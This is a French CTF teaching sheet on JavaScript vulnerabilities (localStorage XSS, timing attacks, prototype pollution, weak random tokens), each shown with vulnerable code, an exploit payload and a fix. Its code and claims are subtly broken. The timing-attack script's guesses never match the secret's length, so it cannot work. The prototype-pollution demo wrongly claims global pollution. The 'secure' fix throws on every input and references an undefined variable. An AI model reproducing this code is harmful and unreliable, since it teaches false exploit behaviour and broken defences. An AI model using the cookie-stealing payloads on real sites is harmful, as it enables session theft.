# Vulnérabilités JavaScript pour CTF

---

## 1. Injection JavaScript via localStorage

### Code Vulnérable
```javascript
function displayLastSearch() {
    let lastSearch = localStorage.getItem('lastSearch');
    document.getElementById('searchHistory').innerHTML = `
        Dernière recherche : ${lastSearch}
    `;
}
```

### Explication
Cette fonction récupère une valeur de localStorage et l'insère directement dans le DOM en utilisant innerHTML. Comme le contenu n'est pas assaini, un attaquant peut injecter du HTML malveillant qui sera exécuté lors de l'affichage.

### Exploitation
1. Ouvrir la console du navigateur
2. Injecter du code malveillant dans localStorage:
```javascript
localStorage.setItem('lastSearch', '<img src=x onerror="alert(document.cookie)">');
```
3. Lors du prochain chargement de la page, le code sera exécuté

### Solution Sécurisée
```javascript
function secureDisplayLastSearch() {
    let lastSearch = localStorage.getItem('lastSearch');
    document.getElementById('searchHistory').textContent = lastSearch;
}
```

## 2. Timing Attack sur Comparaison de Chaînes

### Code Vulnérable
```javascript
async function compareSecret(userInput) {
    const secret = "CTF_SECRET_FLAG_2024";
    if (userInput.length !== secret.length) return false;
    
    for (let i = 0; i < secret.length; i++) {
        if (userInput[i] !== secret[i]) return false;
        await new Promise(resolve => setTimeout(resolve, 50));
    }
    return true;
}
```

### Explication
Cette fonction compare un input utilisateur avec un secret caractère par caractère. Le délai artificiel rend l'attaque plus évidente, mais même sans lui, la comparaison caractère par caractère crée une différence de timing mesurable.

### Exploitation
```javascript
async function timingAttack() {
    const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789';
    let flag = '';
    
    for (let position = 0; position < 16; position++) {
        let maxTime = 0;
        let likelyChar = '';
        
        for (const char of charset) {
            const testFlag = flag + char + 'A'.repeat(15 - position);
            const startTime = performance.now();
            await compareSecret(testFlag);
            const endTime = performance.now();
            const duration = endTime - startTime;
            
            if (duration > maxTime) {
                maxTime = duration;
                likelyChar = char;
            }
        }
        flag += likelyChar;
        console.log(`Position ${position}: Found ${likelyChar} (Flag so far: ${flag})`);
    }
}
```

## 3. Prototype Pollution via Configs

### Code Vulnérable
```javascript
function mergeConfig(userConfig) {
    const defaultConfig = {
        theme: 'light',
        language: 'fr'
    };
    return Object.assign({}, defaultConfig, JSON.parse(userConfig));
}
```

### Explication
Cette fonction fusionne une configuration utilisateur avec des valeurs par défaut. En ne validant pas l'entrée JSON, elle permet à un attaquant de polluer le prototype d'Object et d'injecter des propriétés malveillantes qui affecteront tous les objets.

### Exploitation
1. Créer un payload qui cible le prototype:
```javascript
const maliciousConfig = '{"__proto__": {"isAdmin": true}}';
mergeConfig(maliciousConfig);

// Maintenant, tout nouvel objet aura isAdmin = true
console.log({}.isAdmin); // true
```

2. Impact: Si l'application vérifie les privilèges avec `config.isAdmin`, la pollution permet de bypasser la sécurité

### Solution Sécurisée
```javascript
function secureConfig(userConfig) {
    const config = JSON.parse(userConfig);
    if ('__proto__' in config) {
        throw new Error('Prototype pollution detected');
    }
    return Object.assign({}, defaultConfig, config);
}
```

## 4. Weak Random Token Generation

### Code Vulnérable
```javascript
function generateSessionToken() {
    return Math.random().toString(36).substring(2);
}
```

### Explication
Cette fonction utilise Math.random() pour générer des tokens de session. Math.random() n'est pas cryptographiquement sûr et peut être prédit si on collecte suffisamment d'échantillons.

### Exploitation
```javascript
// Collecte de tokens
const tokens = [];
for(let i = 0; i < 1000; i++) {
    tokens.push(generateSessionToken());
}

// Analyse des patterns et prédiction des prochains tokens
function predictNextToken(tokens) {
    // L'implémentation dépend du PRNG utilisé par le navigateur
    // Mais Math.random() suit souvent des patterns prévisibles
    // après suffisamment d'observations
}
```

### Solution Sécurisée
```javascript
function secureGenerateToken() {
    const array = new Uint32Array(4);
    crypto.getRandomValues(array);
    return Array.from(array, x => x.toString(16)).join('');
}
```

## Ressources Additionnelles

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Web Security Academy](https://portswigger.net/web-security)
- [Google Web Security Guide](https://developers.google.com/web/fundamentals/security)
